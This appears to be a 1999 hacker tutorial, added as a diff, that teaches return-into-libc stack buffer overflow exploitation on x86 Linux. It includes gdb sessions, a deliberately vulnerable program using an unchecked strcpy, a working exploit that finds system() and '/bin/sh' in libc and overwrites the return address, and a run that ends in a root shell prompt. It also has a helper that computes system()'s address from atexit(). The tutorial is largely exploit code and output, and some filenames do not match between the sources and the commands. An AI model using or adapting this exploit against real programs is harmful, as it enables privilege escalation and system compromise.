@@ -1,0 +1,364 @@
+			The OMEGA project finished
+		    +=+-+=+-+=+-+=+-+=+-+=+-+=+-+=+-+=
+			By lamagra <lamagra@uglypig.org>
+
+
+---[ Flashback
+
+In my previous paper, i explained why and a little bit about how.
+There were some difficulties:
+	o sending arguments to the system() call.
+	  (we fixed this using an other program to link the garbage to a shell.)
+
+
+---[ Examination of a program flow
+
+We take this little example program to examine the flow.
+
+<++> omega/example.c
+void foo(char *bla)
+{
+  printf("I got passed %p\n",bla);
+}
+
+void main()
+{
+     foo("fubar");
+}
+<--> 
+
+We compile and fire up gdb.
+
+darkstar:~/omega$ gcc example.c -o example
+darkstar:~/omega$ gdb example
+
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i586-slackware-linux"...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048594 <main>:	pushl  %ebp
+0x8048595 <main+1>:	movl   %esp,%ebp
+0x8048597 <main+3>:	pushl  $0x8049099
+0x804859c <main+8>:	call   0x804857c <foo>
+0x80485a1 <main+13>:	addl   $0x4,%esp
+0x80485a4 <main+16>:	movl   %ebp,%esp
+0x80485a6 <main+18>:	popl   %ebp
+0x80485a7 <main+19>:	ret    
+End of assembler dump.
+(gdb) x/5bc 0x8049099
+0x8049099 <_fini+25>:	102 'f'	117 'u'	98 'b'	97 'a'	114 'r'
+(gdb) disassemble foo
+Dump of assembler code for function foo:
+0x804857c <foo>:	pushl  %ebp
+0x804857d <foo+1>:	movl   %esp,%ebp
+0x804857f <foo+3>:	movl   0x8(%ebp),%eax
+0x8048582 <foo+6>:	pushl  %eax
+0x8048583 <foo+7>:	pushl  $0x8049088
+0x8048588 <foo+12>:	call   0x8048400 <printf>
+0x804858d <foo+17>:	addl   $0x8,%esp
+0x8048590 <foo+20>:	movl   %ebp,%esp
+0x8048592 <foo+22>:	popl   %ebp
+0x8048593 <foo+23>:	ret    
+End of assembler dump.
+(gdb) quit
+darkstar:~/omega$
+
+
+We notice the address of our "fubar" string getting pushed on the stack
+at 0x8048597. After that the foo function is called (0x804859c). 
+After initialisation foo() loads the pushed address into the eax register
+as we can see at 0x804857f. The address is located on 0x8(%ebp), ebp is
+the current stack pointer. 
+
+---[ Implementation
+
+With the previous in mind we write a small test program.
+
+<++> omega/test.c
+/* 
+ * A small test program for project "omega"
+ * Lamagra <lamagra@uglypig.org>
+ */ 
+
+foo(char *bla)
+{
+  printf("foo: %p\n",bla);
+  printf("foo: %s \n",bla);
+}
+
+
+main()
+{
+  char bla[8];
+  char *shell = "/bin/sh";
+  long addy = 0x41414141;
+
+  printf("foo = 0x%x\n",(long)&foo);
+  printf("bla = 0x%x\n",(long)&bla);
+  printf("shell = 0x%x\n",shell);
+  
+  *(long *)&bla[0] = addy;   /* buffer */
+  *(long *)&bla[4] = addy;   /* buffer */
+  *(long *)&bla[8] = addy;   /* saved ebp */
+  *(long *)&bla[12] = &foo;  /* saved eip */
+  *(long *)&bla[16] = addy;  /* Junk */
+  *(long *)&bla[20] = shell; /* address of the arg */
+}
+<-->
+
+The comment explain the use pretty clear, so read them.
+Afterwards compile and run.
+
+darkstar:~/omega$ gcc test.c -otest
+darkstar:~/omega$ test
+foo = 0x804857c
+bla = 0xbffffb08
+shell = 0x8049111
+foo: 0x8049111
+foo: /bin/sh
+segmentation fault
+darkstar:~/omega$ 
+
+The foo function gets called and its argument is placed correctly.
+But after execution it segfaults, let's debug it and find out why.
+
+darkstar:~/omega$ gdb test
+
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i586-slackware-linux"...
+(gdb) break *foo
+Breakpoint 1 at 0x804857c
+(gdb) run
+Starting program: /tmp/omega/hello 
+foo = 0x804857c
+bla = 0xbffffb10
+shell = 0x8049111
+
+Breakpoint 1, 0x804857c in foo ()
+(gdb) x/10wx 0xbffffb10
+0xbffffb10:	0x41414141	0x41414141	0x41414141	0x0804857c
+0xbffffb20:	0x41414141	0x08049111	0xbffffb44	0x00000000
+0xbffffb30:	0x00000000	0x00000000
+(gdb) c
+Continuing.
+foo: 0x8049111
+foo: /bin/sh
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info reg ebp
+ebp            0x41414141	0x41414141
+(gdb) info reg esp
+esp            0xbffffb24	0xbffffb24
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+darkstar:~/omega$ 
+
+The dumb of buffer "bla" shows our intentions very clearly.
+The segfault happens because the program tries to execute 0x41414141.
+That address is at 0xbffffb20. When returning from foo() ebp and eip are
+poped from the stack at the location pointed to by esp. 
+If we wanted to put right the segfault, we could put an other address in
+there (eg. exit()), so it has a clean exit.
+
+Apply this patch to fix it (patch test.c test.patch).
+
+<++> omega/test.patch
+--- old.c	Wed Oct  6 18:49:07 1999
++++ test.c	Wed Oct  6 18:49:25 1999
+@@ -19,6 +19,6 @@
+   *(long *)&bla[4] = addr;   /* buffer */
+   *(long *)&bla[8] = addr;   /* saved ebp */
+   *(long *)&bla[12] = &foo;  /* saved eip */
+-  *(long *)&bla[16] = addr;  /* Junk */
++  *(long *)&bla[16] = &exit; /* exit() */
+   *(long *)&bla[20] = shell; /* address of the arg */
+ }
+<-->
+
+Same thing can be done for multiple arguments.
+0x8(%ebp)  = arg[1]
+0xc(%ebp)  = arg[2]
+0x10(%ebp) = arg[3]
+and so on.
+
+<++> omega/multiple.c
+#include <stdlib.h>
+#include <unistd.h>
+
+main()
+{
+  char bla[8];
+  char *shell = "/bin/sh";
+  long addr = 0x41414141;
+
+  printf("bla = 0x%x\n",(long)&bla);
+  printf("shell = 0x%x\n",shell);
+  
+  *(long *)&bla[0]  = addr;   /* buffer */
+  *(long *)&bla[4]  = addr;   /* buffer */
+  *(long *)&bla[8]  = addr;   /* saved ebp */
+  *(long *)&bla[12] = &execl; /* saved eip */
+  *(long *)&bla[16] = &exit;  /* exit() */
+  *(long *)&bla[20] = shell;  /* arg[1] */
+  *(long *)&bla[24] = shell;  /* arg[2] */
+  *(long *)&bla[28] = 0x0;    /* arg[3] */
+  /* 
+   * Executes execl("/bin/sh","/bin/sh",0x0); 
+   * On error exit("/bin/sh"); i know weird */
+   */
+}
+<-->
+
+
+Now we can exploit a bufferoverflow in a secure environement.
+What about in the wild?
+
+<++> omega/hole.c
+/* 
+ * The hole program.
+ * Prints the address of system() in libc and overflows.
+ */
+#include <stdlib.h>
+#include <dlfcn.h>
+
+main(int argc, char **argv)
+{
+   char buf[8];
+   long addr;
+   void *handle;
+
+   handle = dlopen(NULL,RTLD_LAZY);   
+   addr = (long)dlsym(handle,"system");
+   printf("System() is at 0x%x\n",addr);
+
+   if(argc > 1) strcpy(buf, argv[1]);
+}
+<-->
+
+<++> omega/exploit.c
+/* 
+ * The exploit
+ * Finds the address of system() in libc.
+ * Searches for "/bin/sh" in the neighbourhood of system().
+ * (System() uses that string)
+ * Lamagra <lamagra@uglypig.org>
+ */ 
+
+#include <stdlib.h>
+#include <dlfcn.h>
+
+main(int argc, char **argv)
+{
+   int x,size;
+   char *buf;
+   long addr,shell,exitaddy;
+   void *handle;
+
+   if(argc != 3){
+	printf("Usage %s <bufsize> <program>\n",argv[0]);
+	exit(-1);
+   }
+ 
+   size = atoi(argv[1])+16;
+   if((buf = malloc(size)) == NULL){
+	perror("can't allocate memory");
+	exit(-1);
+   }
+
+   handle = dlopen(NULL,RTLD_LAZY);   
+   addr = (long)dlsym(handle,"system");
+   printf("System() is at 0x%x\n",addr);
+
+   if(!(addr & 0xff) || !(addr & 0xff00) || 
+      !(addr & 0xff0000) || !(addr & 0xff000000))
+   {
+	printf("system() contains a '0', sorry!");
+	exit(-1);
+   }
+
+   shell = addr;
+   while(memcmp((void*)shell,"/bin/sh",8)) 
+	shell++;
+
+   printf("\"/bin/sh\" is at 0x%x\n",shell);
+   printf("print %s\n",shell);
+
+   memset(buf,0x41,size);
+   *(long *)&buf[size-16] = 0xbffffbbc;    
+   *(long *)&buf[size-12] = addr; 
+   *(long *)&buf[size-4]  = shell;    
+   
+   puts("Executing");
+
+   execl(argv[2],argv[2],buf,0x0);
+}
+<-->
+
+darkstar:~/omega$ gcc hole.c -ohole -ldl
+darkstar:~/omega$ gcc omega.c -oomega -ldl
+darkstar:~/omega$ omega 8 vun
+System() is at 0x40043a18
+"/bin/sh" is at 0x40089d26
+print /bin/sh
+Executing
+System() is at 0x40043a18
+bash# 
+
+Looks like it works.
+But as you may have noticed an extra library is linked for this methode.
+That's why it doesn't work on programs that don't have that library
+linked: because the location of system() is different.
+
+There are other methodes to get the correct address:
+
+	o Changing the program to let it print out the address (more or
+	  less the same) 
+	
+	o Getting the address from the ELF-headers. ( I think this doesn't
+	  work on stripped files, solution recompile)
+
+	o getting the address of atexit() (always available) and calculate
+	  the address of system(). Check out included program.
+
+---[ Extra
+
+<++> omega/calc.c
+#include <stdlib.h>
+#include <unistd.h>
+
+main(int argc, char **argv)
+{
+  long addy,diff;
+
+  if (argc != 2)
+  {
+	printf("Usage: %s <addy of atexit>\n",argv[0]);
+	printf("Get the address with GDB\n\t$ echo x atexit|gdb program\n");
+	exit(-1);
+  }
+
+  addy = strtoul(argv[1],0,0);
+  printf("Input = 0x%x\n",addy);
+
+  diff = (long)&atexit - (long)&system;
+  printf("system() = 0x%x\n",addy - diff + 16); 
+}
+<-->
+---[ Reference
+
+  my previous paper in corezine #2 (http://bounce.to/unah16)
+
+
+---[EOF
+
